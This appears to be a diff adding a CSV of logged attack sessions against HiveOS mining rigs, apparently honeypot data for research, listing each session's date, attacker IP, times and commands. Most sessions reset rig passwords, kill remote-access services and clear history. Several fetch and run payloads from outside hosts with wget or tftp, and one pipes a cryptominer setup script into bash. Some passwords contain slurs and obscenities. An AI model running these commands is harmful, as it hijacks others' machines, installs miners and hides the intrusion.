@@ -1,0 +1,102 @@
+attackdate,attackerip,entrancetime,exittime,commands
+2021-11-16,10.0.3.249,23:46:39.964,23:52:30.589,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-23,10.0.3.14,23:59:23.810,00:00:00.631,['uname -s -v -n -r -m']
+2021-11-16,10.0.3.244,00:05:52.938,00:05:53.568,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg;']"
+2021-11-18,10.0.3.54,00:16:54.951,00:16:56.595,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.156,00:44:28.522,01:00:01.921,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.159,01:23:57.580,01:25:30.406,['uname -s -v -n -r -m']
+2021-11-18,10.0.3.82,01:39:31.530,02:00:01.326,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.234,02:03:42.146,02:15:21.849,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.215,02:15:00.718,02:17:58.990,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.111,02:15:24.326,02:15:25.208,['uname -s -v -n -r -m']
+2021-11-21,10.0.3.216,02:16:11.515,02:18:16.407,[]
+2021-11-18,10.0.3.84,02:50:56.580,03:00:01.233,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.97,03:07:17.556,03:23:36.571,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg']"
+2021-11-17,10.0.3.250,03:04:34.631,03:25:55.077,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.170,03:59:14.718,03:59:15.506,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-18,10.0.3.136,03:42:11.719,03:42:21.813,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.86,04:17:23.443,04:17:24.076,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.87,04:16:18.188,04:16:20.438,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-20,10.0.3.218,04:20:14.706,04:30:01.629,"['rm x86_64', 'wget http://205.185.121.185/x86_64', 'chmod 777 *', './x86_64 nigga', 'rm x86_64']"
+2021-11-25,10.0.3.167,04:06:29.347,04:08:59.865,['uname -a']
+2021-11-26,10.0.3.86,04:16:46.326,04:18:15.736,[]
+2021-11-18,10.0.3.217,04:53:37.954,04:53:38.574,"['sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.123,05:19:36.006,05:19:38.259,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-25,10.0.3.201,05:05:34.338,05:18:32.489,['scp -t /tmp/AnfBbFEp']
+2021-11-26,10.0.3.10,05:17:03.690,05:17:24.583,['scp -t /tmp/mVRQIk9l']
+2021-11-17,10.0.3.146,05:46:50.861,06:00:01.140,['scp -t /tmp/cfVOtKnI']
+2021-11-18,10.0.3.186,05:41:38.073,05:41:39.088,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-23,10.0.3.134,05:55:51.524,05:56:17.469,['scp -t /tmp/lTTCyYQD']
+2021-11-17,10.0.3.97,06:29:39.754,06:29:44.417,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-22,10.0.3.172,06:03:17.442,06:11:49.446,['cat /etc/issue']
+2021-11-17,10.0.3.149,06:52:28.047,07:00:02.030,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.244,07:03:14.909,07:03:34.893,['scp -t /tmp/fpAYdwCl']
+2021-11-22,10.0.3.250,07:22:32.417,07:26:38.341,['uname -s -v -n -r -m']
+2021-11-23,10.0.3.180,08:00:00.282,08:00:01.398,['scp -t /tmp/24ib0a2Y']
+2021-11-16,10.0.3.162,08:05:44.889,08:23:38.142,[]
+2021-11-17,10.0.3.10,08:04:57.434,08:04:59.536,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-18,10.0.3.151,08:09:19.420,08:29:10.863,[]
+2021-11-27,10.0.3.37,08:12:40.706,08:17:58.429,['scp -t /tmp/8IXSVFYE']
+2021-11-16,10.0.3.206,08:52:45.796,08:59:25.384,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-18,10.0.3.141,08:50:20.796,08:50:21.594,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-21,10.0.3.133,09:10:12.664,09:12:23.140,[]
+2021-11-17,10.0.3.176,09:45:02.122,09:45:22.039,['scp -t /tmp/4hMLMXSk']
+2021-11-18,10.0.3.72,09:57:10.275,09:58:25.640,['scp -t /tmp/6zYrqZYW']
+2021-11-18,10.0.3.251,10:17:02.035,10:17:05.612,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.28,10:40:46.666,10:44:22.864,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc', 'cat /hive-config/rig.conf']"
+2021-11-26,10.0.3.127,10:42:22.756,11:00:01.117,['scp -t /tmp/dM2noPeL']
+2021-11-18,10.0.3.23,11:13:08.276,11:13:09.080,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-19,10.0.3.30,11:07:51.825,11:14:22.845,"['cat /etc/issue', 'wget http://185.224.129.251/x86_64', 'chmod 777 *', './x86_64 x86xhed', 'echo Niki 6to quitna moito mom4e']"
+2021-11-22,10.0.3.121,11:05:23.370,11:07:19.853,[]
+2021-11-25,10.0.3.38,11:16:42.189,11:17:04.437,['scp -t /tmp/SMVsJSSP']
+2021-11-16,10.0.3.104,11:52:24.117,11:58:40.504,[]
+2021-11-17,10.0.3.165,11:38:02.041,11:51:06.182,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
+2021-11-18,10.0.3.18,11:52:06.701,11:58:54.453,['scp -t /tmp/iypEwbXF']
+2021-11-17,10.0.3.109,12:03:11.440,12:22:20.925,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://172.105.119.145/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 172.105.119.145 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-11-24,10.0.3.102,12:18:53.713,12:19:28.467,['scp -t /tmp/N0DJCiEH']
+2021-11-25,10.0.3.196,12:29:25.422,12:29:44.849,['scp -t /tmp/YpAgzwgQ']
+2021-11-16,10.0.3.74,13:03:10.843,13:03:11.489,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg']"
+2021-11-18,10.0.3.150,13:20:18.875,13:20:19.685,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-23,10.0.3.93,13:23:32.381,13:23:55.031,['scp -t /tmp/nSL9ejn8']
+2021-11-16,10.0.3.193,13:51:52.473,13:51:53.259,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-27,10.0.3.47,13:49:08.141,13:49:30.029,['scp -t /tmp/HNEIif8m']
+2021-11-16,10.0.3.219,14:24:46.789,14:29:31.251,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.122,14:17:35.500,14:17:36.414,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-18,10.0.3.254,14:19:59.935,14:20:49.741,"['sudo hive-passwd localhost', 'echo localhost', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-22,10.0.3.122,14:04:09.695,14:20:12.086,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://194.85.250.154/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 194.85.250.154 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
+2021-11-16,10.0.3.101,14:49:53.994,14:49:55.247,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.224,14:57:35.091,15:00:01.060,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-23,10.0.3.93,14:57:50.175,14:58:51.255,['scp -t /tmp/x4vMMzhQ']
+2021-11-16,10.0.3.179,15:17:16.370,15:24:17.881,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.70,15:03:58.133,15:16:46.798,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg']"
+2021-11-18,10.0.3.54,15:07:13.805,15:07:32.837,['scp -t /tmp/f3WiKLao']
+2021-11-22,10.0.3.74,15:08:23.200,15:17:55.927,['scp -t /tmp/up1NfbdM']
+2021-11-16,10.0.3.170,N/A,15:43:21.991,[]
+2021-11-17,10.0.3.125,16:20:07.403,16:29:06.576,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-25,10.0.3.206,16:26:36.334,16:27:05.779,"['sudo hive-passwd presidenthiveassos123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-19,10.0.3.3,17:03:10.135,17:03:38.801,['scp -t /tmp/kIkHHha2']
+2021-11-24,10.0.3.61,17:26:55.177,17:26:55.859,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevabase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-25,10.0.3.50,17:08:26.268,17:16:55.441,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 42yvmZB43FH6d9pccfUvBo9Kne6QCP9RhepyjGeqoYeh2zF4XXrVDFi4fGydEUyFPhJEZWhp22LuCWSYEPeeKQp6PXwwW3G']
+2021-11-26,10.0.3.168,17:03:43.890,17:03:45.537,"['sudo hive-passwd 0ovalirlfo4213', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.84,17:44:46.709,17:44:48.323,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-25,10.0.3.203,17:58:33.569,17:58:34.186,"['sudo hive-passwd `hostname`', 'echo `hostname`', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.127,18:18:27.374,18:25:26.164,"['sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.35,19:21:03.460,19:25:14.999,[]
+2021-11-22,10.0.3.59,19:22:26.431,19:22:26.648,"['sudo hive-passwd `hostname`', 'echo `hostname`', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.122,20:06:17.186,20:18:22.901,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-19,10.0.3.16,20:19:10.141,20:19:41.992,['scp -t /tmp/FuWAHKJm']
+2021-11-21,10.0.3.211,20:08:21.956,20:08:41.645,['scp -t /tmp/YiRXmMpc']
+2021-11-16,10.0.3.137,20:43:54.784,20:43:57.024,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-17,10.0.3.24,20:44:21.611,20:53:46.829,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-17,10.0.3.54,21:10:04.606,21:27:46.497,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-25,10.0.3.51,21:16:44.768,21:16:45.500,"['sudo hive-passwd presidenthiveassos123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-15,10.0.3.201,21:50:57.465,21:50:59.526,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-16,10.0.3.130,21:59:11.445,22:00:01.204,['sudo hive-passwd AfafAFaSTAFaFafA%saDF#FA#@aaaa']
+2021-11-17,10.0.3.19,21:53:00.768,22:00:02.002,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-15,10.0.3.9,22:22:49.833,22:22:50.654,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
+2021-11-16,10.0.3.113,22:04:47.639,22:22:58.389,['scp -t /tmp/3YfkZ6GC']
+2021-11-17,10.0.3.93,22:44:42.900,22:44:44.599,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
+2021-11-19,10.0.3.51,22:57:09.435,23:00:01.704,['scp -t /tmp/z2OEJQ8L']
+2021-11-21,10.0.3.186,22:42:13.184,22:47:25.573,[]
+2021-11-22,10.0.3.208,22:39:45.182,22:40:04.106,['scp -t /tmp/zOaXv1m7']
+2021-11-17,10.0.3.208,23:07:16.921,23:20:36.083,"['sudo hive-passwd cummingonthecumrightinfrontofthecumwhichiscummingonthecummyfloor', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
